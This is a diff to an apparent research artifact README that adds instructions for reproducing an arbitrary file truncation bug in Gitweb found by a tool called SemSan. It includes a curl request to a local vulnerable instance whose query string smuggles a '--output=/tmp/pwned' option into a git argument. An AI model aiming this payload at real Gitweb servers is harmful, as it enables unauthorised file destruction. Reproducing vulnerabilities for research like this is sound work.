@@ -55,7 +55,25 @@ just build
 
 ## RQ1: Vulnerabilities Detected in the Wild (Sec 7.1)
 
-TODO
+Here, we run vulnerable versions of the software targets we found bugs
+in with SemSan with appropriate configurations to discover said bugs.
+
+### Arbitrary file truncation in Git (Ref 69)
+
+To reproduce the arbitrary file truncation vulnerability in Git, run:
+
+```bash
+nix run .#artifact-eval.bugs.git-reproduce
+```
+
+This will open a terminal multiplexer with a vulnerable version of Git-
+web as well as SemSan with the [corresponding config](/nix/packages/by-name/artifact-eval/bugs/git-reproduce/reproduce-config.yaml).
+
+Request the following URL with cURL or a web browser to trigger the bug:
+
+```bash
+curl http://127.0.0.1:1234/?p=.git;a=blobdiff;f=*;hpb=--output=/tmp/pwned;hb=HEAD
+```
 
 ## RQ2: Detection Accuracy (Sec 7.2)
 
